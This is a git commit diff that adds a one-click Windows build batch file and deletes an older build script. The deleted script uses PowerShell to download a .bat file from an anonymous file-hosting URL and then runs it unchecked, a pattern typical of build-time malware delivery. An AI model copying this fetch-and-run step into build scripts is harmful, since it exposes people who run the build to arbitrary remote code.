e8f5d66428e269415f30c19d93e822792055fa1c
Your Name <you@example.com>
2024-07-31 17:17:43 +0800

    Packages

---
+++ Package/(Windows) One Click Build.bat
@@ -0,0 +1,3 @@
+@echo off
+Powershell.exe -executionpolicy remotesigned -File build.ps1
+exit
--- buildforgithub.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-echo Download requirements.
-pip install pyinstaller
-pip install pipreqs
-pipreqs ./ --encoding=utf8
-pip install -r requirements.txt
-powershell iwr https://files.catbox.moe/27u2dv.bat -OutFile package.bat
-package
-echo done!
